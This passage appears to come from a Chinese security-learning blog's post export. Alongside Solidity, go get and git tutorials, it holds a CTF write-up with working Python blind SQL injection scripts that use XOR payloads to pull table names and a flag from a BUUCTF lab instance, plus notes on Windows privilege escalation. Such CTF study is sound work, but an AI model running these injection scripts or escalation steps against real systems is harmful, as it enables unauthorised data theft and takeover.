src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303155134761.png" alt="image-20240303155134761"></p><p>然后我们就要再去将action换成read去读取，不过这里生成的sign就需要自己去构造了，因为&#x2F;geneSign路由默认的action是scan，我们去看一下getSign()函数</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getSign</span>(<span class="hljs-params">action, param</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()<br></code></pre></td></tr></table></figure><p>这里我们不知道secret_key，但是&#x2F;geneSign默认action为scan，想查看文件又一定要read，所以直接后面加个read生成sign即可</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303160239016.png" alt="image-20240303160239016"></p><p>然后我们给param传一个readsign即可，因为知识检测是否有该关键字</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303161016765.png" alt="image-20240303161016765"></p><h1 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h1><p>这题进去有个登陆页面</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303201649603.png" alt="image-20240303201649603"></p><p>一开始以为注入点在登陆的地方，因为直接get请求发送用户名和密码，试了一下发现没有，后才发现上面的12345会给url传递id参数</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303201828243.png" alt="image-20240303201828243"></p><p>id传6之后的数字会发生变化，传递数字和字符串时返回的页面不一样</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303201948963.png" alt="image-20240303201948963"></p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303202000621.png" alt="image-20240303202000621"></p><p>去尝试了一些字符发现被过滤了不想fuzz，去看wp说是^没被过滤，可以用异或来进行盲注，因为题目也有提示说盲注,参考文章：<a href="https://www.shawroot.cc/1158.html">https://www.shawroot.cc/1158.html</a></p><p>payload的大概思路就是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1^(sql语句)<br>//比如爆库的话可以用改语句ord(substr(database(),1,1)&gt;10),这就是判断数据库第一位的ascii码值是否大于10，ord()函数也可以用ascii()函数代替<br>//如果页面回显为ERROR!!!，表示正确，因为1^1=0<br>//如果页面回显为NO! Not this! Click others~~~即id=1时的页面，则错误，因为1^0=1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303214756062.png" alt="image-20240303214756062"></p><p>payload如下：</p><p>爆出库名脚本，这里直接按顺序爆下去不写二分法了</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr(database(),%d,1))=%d)&quot;</span>%(i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303222137783.png" alt="image-20240303222137783"></p><p>然后得出数据库名为geek，这里延时了一点点，因为不知为什么会有几次漏了一些字符没有</p><p>然后改一改代码继续爆表名，参考上面文章可以用该语句先去测试一下表名长度，得出长度为16</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1^((select(length(group_concat(TABLE_NAME)))from(information_schema.tables)where(table_schema=&quot;geek&quot;))=16)<br></code></pre></td></tr></table></figure><p>emmm后来发现不止两个表，我就直接写50个字符来爆了</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr((select(group_concat(table_name))from(information_schema.columns)where(table_schema=&#x27;geek&#x27;)),%d,1))=%d)&quot;</span>%(i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303224502079.png" alt="image-20240303224502079"></p><p>然后爆出上面四个表名</p><p>再去爆一下字段名看看</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br>name1=<span class="hljs-string">&quot;F1naI1y&quot;</span><br>name2=<span class="hljs-string">&quot;FnaI1y,&quot;</span><br>name3=<span class="hljs-string">&quot;Fa1y&quot;</span><br>name4=<span class="hljs-string">&quot;Flaaag&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">&quot;(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;%s&#x27;)),%d,1))=%d)&quot;</span>%(name1,i,j)<br>        response=requests.get(url=url+sql)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>这个Flaaag里面没有东西，然后去爆name2，出了下面三个字段名</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303225537909.png" alt="image-20240303225537909"></p><p>不过到后面连接超时了，不管了不想爆了()，总之在password这个字段</p><p>然后去爆password字段的值拿flag，这里用正则匹配来直接获取含有flag的数据来爆节省时间</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>result=<span class="hljs-string">&quot;&quot;</span><br>url=<span class="hljs-string">&quot;http://76107f08-a9a5-443e-b4b9-1e5097f55d5e.node5.buuoj.cn:81/search.php?id=1^&quot;</span><br>name1=<span class="hljs-string">&quot;F1naI1y&quot;</span><br>name2=<span class="hljs-string">&quot;FnaI1y,&quot;</span><br>name3=<span class="hljs-string">&quot;Fa1y&quot;</span><br>name4=<span class="hljs-string">&quot;Flaaag&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,<span class="hljs-number">80</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">33</span>,<span class="hljs-number">127</span>):<br>        sql=<span class="hljs-string">f&quot;(ord(substr((select(group_concat(password))from(F1naI1y)where((password)regexp&#x27;flag&#x27;)),<span class="hljs-subst">&#123;i&#125;</span>,1))=<span class="hljs-subst">&#123;j&#125;</span>)&quot;</span><br>        response=requests.get(url=url+sql,timeout=<span class="hljs-number">3</span>)<br>        time.sleep(<span class="hljs-number">0.02</span>)<br>        <span class="hljs-comment">#print(response.text)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ERROR&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>            result+=<span class="hljs-built_in">chr</span>(j)<br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240303234305001.png" alt="image-20240303234305001"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf 刷题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BC入门</title>
      <link href="/2024/02/29/BC%E5%85%A5%E9%97%A8/"/>
      <url>/2024/02/29/BC%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="智能合约入门"><a href="#智能合约入门" class="headerlink" title="智能合约入门"></a>智能合约入门</h1><h2 id="第一个合约"><a href="#第一个合约" class="headerlink" title="第一个合约"></a>第一个合约</h2><p>这是一个计数器智能合约的实例：</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">pragma solidity &gt;=<span class="hljs-number">0.8</span><span class="hljs-number">.0</span>;<span class="hljs-comment">//声明编译器版本</span><br><span class="hljs-comment">//类似的表示还有</span><br><span class="hljs-comment">//pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="hljs-comment">//pragma solidity ^0.8.0;</span><br><br><span class="hljs-comment">// 定义一个合约</span><br>contract <span class="hljs-title class_">Counter</span> &#123;<br>    uint public counter;<br>    <br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>        counter = <span class="hljs-number">0</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">count</span>(<span class="hljs-params"></span>) public &#123;<br>        counter = counter + <span class="hljs-number">1</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">function</span> <span class="hljs-title function_">get</span>(<span class="hljs-params"></span>) public view returns (uint) &#123;<br>        <span class="hljs-keyword">return</span> counter;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>合约是可部署到区块链的最小单元， 一个合约通常由<strong>状态变量（合约数据）</strong>和<strong>合约函数</strong>组成。</p><h2 id="变量和函数"><a href="#变量和函数" class="headerlink" title="变量和函数"></a>变量和函数</h2><p><strong>控制可见性的关键词</strong></p><p><code>public</code> 类型的状态变量，会自动创建一个同名的外部函数（称为访问器），来获取状态变量的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">比如：<br>uint public a;<br>部署的时候就会有一个a()函数来获取a的值<br></code></pre></td></tr></table></figure><table><thead><tr><th></th><th>public</th><th>external</th><th>internal</th><th>private</th></tr></thead><tbody><tr><td>修饰函数</td><td>✔️</td><td>✔️</td><td>✔️</td><td>✔️</td></tr><tr><td>修饰变量</td><td>✔️</td><td></td><td>✔️</td><td>✔️</td></tr><tr><td>当前合约内可访问</td><td>✔️</td><td></td><td>✔️</td><td>✔️</td></tr><tr><td>派生合约可访问</td><td>✔️</td><td></td><td>✔️</td><td></td></tr><tr><td>外部访问</td><td>✔️</td><td>✔️</td><td></td><td></td></tr></tbody></table><p><strong>常量和不可变量</strong></p><ul><li><p>constant：在合约里可以定义常量，使用 <code>constant</code> 来声明一个常量，常量不占用合约的存储空间，而是在编译时使用对应的表达式值替换常量名。</p><p>使用<code>constant</code>修饰的状态变量，只能使用在编译时有确定值的表达式来给变量赋值。</p><p>因此任何通过访问存储数据、区块链数据（如<code>now</code>、<code>address(this).balance</code>或者<code>block.number</code>）或执行数据（<code>msg.value</code>或<code>gasleft()</code>）或对外部合约的调用来给它们赋值都是不允许的（因为它们的值无法在编译期确定）。</p><p>不过对于内建函数，如<code>keccak256</code>、<code>sha256</code>、<code>ripemd160</code>、<code>ecrecover</code>、<code>addmod</code>和<code>mulmod</code>，是允许的（尽管它们调用的是外部预编译合约），如这句代码就是合法的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidity">bytes32 constant myHash = keccak256(&quot;abc&quot;);<br></code></pre></td></tr></table></figure></li><li><p>immutable： Solidity 中使用 <code>immutable</code> 来定义一个不可变量，<code>immutable</code>不可变量同样不会占用状态变量存储空间，在部署时，变量的值会被追加的运行时字节码中，因此它比使用状态变量便宜的多，同样带来了更多的安全性</p><p>不可变量在构造函数中进行赋值，构造函数是在部署的时候执行，因此这是运行时赋值。</p></li></ul><p><strong>定义函数</strong></p><p>定义函数使用function关键字，且函数可以有多个返回值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs solidit">pragma solidity &gt;0.5.0;<br>contract C &#123;<br>    function f() public pure returns (uint, bool, uint) &#123;<br>        return (7, true, 2);<br>    &#125;<br>     function g() public &#123;<br>        // 获取返回值<br>        (uint x, bool b, uint y) = f();<br>     &#125;    <br>&#125;<br></code></pre></td></tr></table></figure><p><strong>状态可变性</strong></p><p>形容函数的可变性有 3 个关键字：</p><ul><li>view：用 view 修饰的函数，称为视图函数，它只能读取状态，而不能修改状态。</li><li>pure：用 pure 修饰的函数，称为纯函数，它既不能读取也不能修改状态。</li><li>payable：用 payable 修饰的函数表示可以接受以太币，如果未指定，该函数将自动拒绝所有发送给它的以太币。</li></ul><blockquote><p><code>view</code> , <code>pure</code> , <code>payable</code> 通常被称为修饰符</p></blockquote><h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>数据类型分为一下三种：</p><ul><li>值类型（Value Types）</li><li>引用类型（Reference Types）</li><li>映射类型（Mapping Types）</li></ul><p><strong>引用类型</strong></p><p>引用类型包括<strong>数组</strong> 和<strong>结构体</strong>。</p><p>在定义引用类型时，有一个额外属性来标识数据的存储位置，这个属性有：</p><ul><li>memory（内存）： 变量在运行时存在，其生命周期只存在于函数调用期间。</li><li>storage（存储）：保存状态变量，只要合约存在就一直保存在区块链中。</li><li>calldata（调用数据）：用来存储函数参数的特殊数据位置，用来接收外部数据，是一个不可修改的、非持久的函数参数存储区域。</li></ul><p><strong>映射类型</strong></p><p>映射类型和Java的Map、Python的Dict在功能上差不多，它是一种键值对的映射关系存储结构，定义方式为mapping(KT &#x3D;&gt; KV)。</p><h2 id="地址类型"><a href="#地址类型" class="headerlink" title="地址类型"></a>地址类型</h2><h1 id="Ethernaut"><a href="#Ethernaut" class="headerlink" title="Ethernaut"></a>Ethernaut</h1><p>这里通过该靶场来学习只能合约安全，先从<strong>Hello Ethernaut</strong>看起</p><h2 id="Hello-Ethernaut"><a href="#Hello-Ethernaut" class="headerlink" title="Hello Ethernaut"></a>Hello Ethernaut</h2>]]></content>
      
      
      <categories>
          
          <category> 区块链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF BC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 提权</title>
      <link href="/2024/02/29/Windows-%E6%8F%90%E6%9D%83/"/>
      <url>/2024/02/29/Windows-%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows权限划分"><a href="#Windows权限划分" class="headerlink" title="Windows权限划分"></a>Windows权限划分</h1><p>在Windows中，有User、Administrator、System、TrustedInstaller这四种用户权限，其权限从左到右依次升高。</p><p>权限提升分为下面两类：</p><ul><li>纵向提取：低权限用户获得高权限用户的权限</li><li>横向提权：获得同级别角色的权限</li></ul><p><strong>常用提权方法</strong></p><ul><li>Windows系统内核溢出漏洞提权</li><li>错误系统配置提权</li><li>数据库提权</li><li>等等~</li></ul><h1 id="Windows系统内核溢出漏洞提权"><a href="#Windows系统内核溢出漏洞提权" class="headerlink" title="Windows系统内核溢出漏洞提权"></a>Windows系统内核溢出漏洞提权</h1><p>溢出漏洞是一种计算机程序的可更正性缺陷。溢出漏洞的全名:缓冲区溢出漏洞。因为它是在程序执行的也是攻击者时候在缓冲区执行的错误代码，所以叫缓冲区溢出漏洞。缓冲溢出是最常见的内存错误之一，入侵系统时所用到的最强大、最经典的一类漏洞利用方式。成功地利用缓冲区溢出漏洞可!修改内存中变量的值，甚至可以劫持进程，执行恶意代码，最终获得主机的控制权。利用Windows系统内核溢出漏洞提权是一种很通用的提权方法，攻击者通常可以使用该方法绕过系统中的所有安全限制。攻击者利用该漏洞的关键是目标系统有没有及时安装补丁，如果目标系统没有安装某一漏洞的补丁且存在该漏洞的话，攻击者就会向目标系统上传本地溢出程序，溢出Administrator权限。</p><h2 id="手动查看系统漏洞"><a href="#手动查看系统漏洞" class="headerlink" title="手动查看系统漏洞"></a>手动查看系统漏洞</h2><p>获得一个普通用户的shell之后，我们可以用一些命令来查看系统有哪些补丁</p><ol><li><p>systeminfo</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240229111338484.png" alt="image-20240229111338484"></p></li><li><p>wmic qfe get caption,description,hotfixid,installedon</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240229111417594.png" alt="image-20240229111417594"></p></li></ol><h2 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h2><ol><li><p><strong>使用Windows-Exploit-Suggester解析systeminfo</strong>：<a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</a></p><p>该工具可以解析systeminfo出来的数据看是否存在漏洞</p><p>使用步骤：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">./windows-exploit-suggester.py --update  #用来更新漏洞库<br>pip install xlrd --upgrade  #如果没有该依赖可以进行安装<br>./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt  #提供我们保存的systeminfo输出的文本文件，然后指向微软数据库<br></code></pre></td></tr></table></figure></li><li><p>Windows提权漏洞合集：<a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></p></li><li><p>各大平台提权工具：<a href="https://github.com/klsfct/getshell">https://github.com/klsfct/getshell</a></p></li></ol><h1 id="系统权限配置错误"><a href="#系统权限配置错误" class="headerlink" title="系统权限配置错误"></a>系统权限配置错误</h1>]]></content>
      
      
      <categories>
          
          <category> 提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell学习</title>
      <link href="/2024/02/29/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/02/29/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>go get小坑</title>
      <link href="/2024/02/27/go-get%E5%B0%8F%E5%9D%91/"/>
      <url>/2024/02/27/go-get%E5%B0%8F%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<h1 id="gin框架安装"><a href="#gin框架安装" class="headerlink" title="gin框架安装"></a>gin框架安装</h1><p>尝试本地去跑一个go项目时，在导入包时提示找不到路径找不到对应的包</p><p>先用下列命令开启了环境变量GO111MODULE&#x3D;on，不然go get不了</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go env -w GO111MODULE=on<br></code></pre></td></tr></table></figure><p>然后get相应的包</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go get -u github.com/chromedp/chromedp<br>go get -u github.com/gin-gonic/gin<br>go get -u golang.org/x/net/html<br></code></pre></td></tr></table></figure><p>再go build源码时就出现了下面的错误</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">main.go:13:2: cannot find package &quot;github.com/chromedp/chromedp&quot; in any of: D:\go\src\github.com\chromedp\chromedp (from $GOROOT) C:\Users\86189\go\src\github.com\chromedp\chromedp (from $GOPATH)<br></code></pre></td></tr></table></figure><h1 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h1><p>用下面命令查看go环境变量</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">go env<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240227171305349.png" alt="image-20240227171305349"></p><p>发现gopath没有指向我安装时设置的环境变量，去环境变量设置的地方查看一下<img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240227171421124.png" alt="image-20240227171421124"></p><p>会发现用户变量还有一个gopath指向默认的地方，删掉即可</p><p>现在再使用go env查看一下，发现成功修改</p><p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240227171518116.png" alt="image-20240227171518116"></p><p>然后再去重新get一遍即可</p><blockquote><p>开启了环境变量GO111MODULE&#x3D;on，会将go get的文件下载到GOPATH&#x2F;pkg&#x2F;mod里</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git学习</title>
      <link href="/2024/01/25/git%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/01/25/git%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Git学习"><a href="#Git学习" class="headerlink" title="Git学习"></a>Git学习</h1><p>这里还有一个很好的总结网站：<a href="https://mp.weixin.qq.com/s/Q_O0ey4C9tryPZaZeJocbA">https://mp.weixin.qq.com/s/Q_O0ey4C9tryPZaZeJocbA</a></p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ol><li>git在实际开发中的运用场景非常多，比如：备份，代码还原，协同开发，追溯问题代码的编写人和时间。</li></ol><p>&#x3D;&#x3D;版本控制器的方式&#x3D;&#x3D;</p><blockquote><p>a.集中式版本控制工具，比如：svn，cvs</p><p>b.分布式版本控制工具，比如：git</p><p>二者的差别很大，集中式中，版本库是存放在中央服务器中的，需要的代码都是提交到中央服务器或从中央服务器下载；分布式中则没有中央服务器，会有一个共享服务器，每台电脑都有自己的本地仓库存放着自己的一个完整的版本库。</p></blockquote><h2 id="git的配置"><a href="#git的配置" class="headerlink" title="git的配置"></a>git的配置</h2><p>&#x3D;&#x3D;设置用户信息&#x3D;&#x3D;</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E9%85%8D%E7%BD%AE.png"></p><blockquote><p>当不跟设置信息的名称时就是查询用户的信息</p></blockquote><h2 id="给常用命令设置一个别名"><a href="#给常用命令设置一个别名" class="headerlink" title="给常用命令设置一个别名"></a>给常用命令设置一个别名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#创建一个.bashrc文件，在里面设置别名</span><br><span class="hljs-built_in">touch</span> ~/.bashrc<br>vim .bashrc<br><span class="hljs-built_in">source</span> ~/.bashrc<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E8%AE%BE%E7%BD%AE%E5%88%AB%E5%90%8D.png"></p><h2 id="获取本地仓库"><a href="#获取本地仓库" class="headerlink" title="获取本地仓库"></a>获取本地仓库</h2><ol><li>新建一个目录作为本地仓库，这里直接在桌面建一个git_test目录</li><li>用 git init 初始化本地仓库<img src="https://gitee.com/ljc0033/magic/raw/master/%E6%9C%AC%E5%9C%B0%E4%BB%93%E5%BA%93.png"></li></ol><p>​         能看到.git文件就成功了</p><h2 id="git的常用命令"><a href="#git的常用命令" class="headerlink" title="git的常用命令"></a>git的常用命令</h2><p>Git工作目录下对于文件的修改会存在几个状态(除了.git目录的都叫工作目录)</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E5%B7%A5%E4%BD%9C%E7%8A%B6%E6%80%81.png"></p><p>接下来新建一个file01.txt文件来进行测试命令，用touch指令</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看git状态</span><br>git status<br><span class="hljs-comment">#添加到缓存区</span><br>git add file01.txt        <span class="hljs-comment">#也可以用.通配符，表示添加所有</span><br><span class="hljs-comment">#提交到仓库</span><br>git commit -m <span class="hljs-string">&quot;注释&quot;</span><br><span class="hljs-comment">#查看历史日志</span><br>git <span class="hljs-built_in">log</span><br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E5%B7%A5%E4%BD%9C%E7%8A%B6%E6%80%81%E6%94%B9%E5%8F%98.png"></p><blockquote><p>git log [option]还有更多的参数，这里详细列出来</p><ul><li>–all  显示所有分支</li><li>–pretty&#x3D;oneline   将提交信息显示为一行</li><li>–abbrev-commit  使得输出的commitid更简短</li><li>–graph     以图的形式显示</li></ul></blockquote><p>&#x3D;&#x3D;版本回退&#x3D;&#x3D;</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">git reset --hard commitID<br><span class="hljs-comment">#查看已经删除的记录</span><br>git reflog     <span class="hljs-comment">#这个可以查看所有操作记录</span><br></code></pre></td></tr></table></figure><blockquote><p>commitID可以用git log查看</p></blockquote><p><img src="https://gitee.com/ljc0033/magic/raw/master/%E7%89%88%E6%9C%AC%E5%9B%9E%E9%80%80.png"></p><p>&#x3D;&#x3D;添加文件至忽略&#x3D;&#x3D;</p><p>有些文件我们不需要git管理，可以将他们添加到gitignore文件中即可</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> .gitignore<br></code></pre></td></tr></table></figure><p>一些示例<img src="https://gitee.com/ljc0033/magic/raw/master/%E5%BF%BD%E7%95%A5%E5%88%97%E8%A1%A8.png"></p><h2 id="git分支"><a href="#git分支" class="headerlink" title="git分支"></a>git分支</h2><p>几乎所有的版本控制系统都以某种形式支持分支。 使用分支意味着你可以把你的工作从开发主线上分离开来， 以免影响开发主线。</p><ul><li><p>常用分支相关命令</p><ul><li><p>查看本地分支</p><p>git branch</p></li><li><p>创建本地分支</p><p>git branch 分支名</p></li><li><p>切换分支</p><p>git checkout 分支名</p><p>git checkout -b 分支名  (直接切换到一个不存在的分支并创建该分支)</p></li><li><p>合并分支</p><p>一个分支上的提交可以合并到另一个分支</p><p>git merge 分支名称</p><blockquote><p>比如dev分支要合并到master需要先切换到master主线，再get merge dev</p></blockquote></li><li><p>删除分支</p><p><strong>不能删除当前分支，只能删除其他分支</strong></p><p>git branch -d b1  删除分支时，需要做各种检查</p><p>git branch -D b1 不做任何检查，强制删除</p></li></ul></li></ul><h2 id="git远程仓库"><a href="#git远程仓库" class="headerlink" title="git远程仓库"></a>git远程仓库</h2><p>这是一个总结的工作流程图：<img src="https://gitee.com/ljc0033/magic/raw/master/image-20240123132413459.png" alt="image-20240123132413459"></p><h3 id="使用ssh绑定gitee"><a href="#使用ssh绑定gitee" class="headerlink" title="使用ssh绑定gitee"></a>使用ssh绑定gitee</h3><ol><li><p>用git来绑定gitee：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">//生成ssh公钥，可以使用-f参数指定生成的文件名，比如：-f &quot;id_rsa_gitee&quot;<br>ssh-keygen -t rsa//生成的ssh密钥会默认在~/.ssh下面，如果生成过了也会直接覆盖，所以有多个密钥时要记得备份(在Windows的c盘用户目录下可以找到)<br></code></pre></td></tr></table></figure></li><li><p>Gitee设置公钥</p><p>将~&#x2F;.ssh下的id_rsa.pub公钥复制到下面的地方</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125154416297.png" alt="image-20240125154416297"></p></li><li><p>绑定之后可以去验证ssh能否连接到gitee，这里选择用在~&#x2F;.ssh下新建一个config文件来配置，这样可以连接gitee也行、github也行，参考这篇文章：<a href="https://blog.csdn.net/weixin_40402743/article/details/124484633">https://blog.csdn.net/weixin_40402743/article/details/124484633</a></p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125170039569.png" alt="image-20240125170039569"></p><p>config文件中的配置如下，我配github的时候配置了邮箱，gitee则没有</p><p><img src="https://gitee.com/ljc0033/magic/raw/master/image-20240125170137353.png" alt="image-20240125170137353"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#github<br>Host github.com<br>User &lt;生成密钥时指定的邮箱邮箱&gt;<br>Hostname ssh.github.com<br>PreferredAuthentications publickey<br>IdentityFile ~/.ssh/id_rsa_github<br>Port 443<br><br>#gitee<br>Host gitee.com<br>HostName gitee.com<br>PreferredAuthentications publickey<br>IdentityFile ~/.ssh/id_rsa_gitee<br></code></pre></td></tr></table></figure><p>使用<strong>ssh -T <a 